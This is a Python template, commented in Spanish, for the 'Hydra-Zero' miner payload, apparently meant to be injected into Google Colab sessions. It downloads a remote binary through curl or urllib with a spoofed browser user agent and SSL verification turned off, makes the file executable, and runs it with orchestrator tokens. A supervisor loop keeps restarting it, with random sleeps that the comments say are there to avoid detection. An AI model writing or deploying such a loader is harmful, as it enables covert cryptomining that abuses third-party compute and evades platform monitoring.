# tools/provisioner/src/assets/miner_template.py
# =================================================================
# APARATO: HYDRA-ZERO MINER PAYLOAD (PYTHON NATIVE)
# ESTÁNDAR: PYTHON 3.8+ COMPATIBLE
# =================================================================

import os
import subprocess
import time
import sys
import random
import urllib.request
import ssl
import signal
import shutil

# --- CONFIGURACIÓN INYECTADA ---
# Estas variables serán reemplazadas por el Provisioner en tiempo de vuelo
URL_BIN = "{{MINER_BINARY_URL}}"
URL_API = "{{ORCHESTRATOR_URL}}"
AUTH_TOKEN = "{{WORKER_AUTH_TOKEN}}"
WORKER_ID = "{{WORKER_ID}}"
BIN_FILENAME = "miner_core.bin"

# Headers de evasión para la descarga
USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

def log(msg):
    """Salida con timestamp para logs de Colab."""
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)

def acquire_binary():
    """Descarga híbrida (CURL + Python Fallback) resiliente."""
    retry_count = 0
    max_retries = 6

    while retry_count < max_retries:
        try:
            log(f"⬇️ Fase 1: Adquiriendo binario (Intento {retry_count + 1})...")

            # ESTRATEGIA A: CURL del Sistema (Más rápido y sigiloso)
            if shutil.which("curl"):
                cmd = f"curl -L -f -s -A '{USER_AGENT}' -o {BIN_FILENAME} {URL_BIN}"
                res = subprocess.call(cmd, shell=True)
                if res == 0 and os.path.exists(BIN_FILENAME):
                    # Verificación simple de tamaño (>1MB)
                    if os.path.getsize(BIN_FILENAME) > 1024 * 1024:
                        log("✅ Estrategia A (CURL) Exitosa.")
                        os.chmod(BIN_FILENAME, 0o755)
                        return True

            # ESTRATEGIA B: Python Nativo (Fallback)
            log("⚠️ Estrategia A falló o no disponible. Iniciando Estrategia B (Nativa)...")
            ctx = ssl._create_unverified_context()
            req = urllib.request.Request(
                URL_BIN,
                headers={'User-Agent': USER_AGENT}
            )
            with urllib.request.urlopen(req, context=ctx, timeout=45) as response, open(BIN_FILENAME, 'wb') as out_file:
                shutil.copyfileobj(response, out_file)

            os.chmod(BIN_FILENAME, 0o755)

            if os.path.getsize(BIN_FILENAME) < 1024 * 1024:
                raise Exception("Binario corrupto detectado (Tamaño insuficiente).")

            log("✅ Estrategia B Exitosa.")
            return True

        except Exception as e:
            log(f"❌ Excepción de descarga: {e}")
            retry_count += 1
            # Backoff Exponencial con Jitter
            sleep_time = (2 ** retry_count) + random.uniform(0, 3)
            time.sleep(sleep_time)

    return False

def signal_handler(sig, frame):
    log("🛑 Señal recibida. Apagando ordenadamente.")
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    log(f"🚀 Iniciando Nodo Hydra: {WORKER_ID}")

    if not acquire_binary():
        log("💀 CRÍTICO: Fallo en adquisición de payload. Abortando nodo.")
        return

    # Construcción de argumentos para el binario Rust
    cmd = [
        f"./{BIN_FILENAME}",
        f"--orchestrator-url={URL_API}",
        f"--auth-token={AUTH_TOKEN}",
        f"--worker-id={WORKER_ID}"
    ]

    # Bucle de Supervisión de Proceso
    while True:
        log("🔥 Encendiendo Motor de Minería...")
        process = None
        try:
            # Ejecutamos el binario y heredamos stdout/stderr para ver logs en Colab
            process = subprocess.Popen(cmd, stdout=sys.stdout, stderr=sys.stderr)
            rc = process.wait()

            if rc == 0:
                log("🏁 Proceso completado normalmente.")
                break # Salimos si el minero termina bien (ej: no hay más trabajos)
            else:
                log(f"⚠️ Proceso terminado (Exit Code: {rc}). Reiniciando...")

            # Enfriamiento aleatorio para evitar detección de bucle rápido
            time.sleep(random.randint(5, 15))

        except Exception as e:
            log(f"💀 Error del Supervisor: {e}")
            time.sleep(30)
        finally:
            if process and process.poll() is None:
                process.kill()

if __name__ == "__main__":
    main()
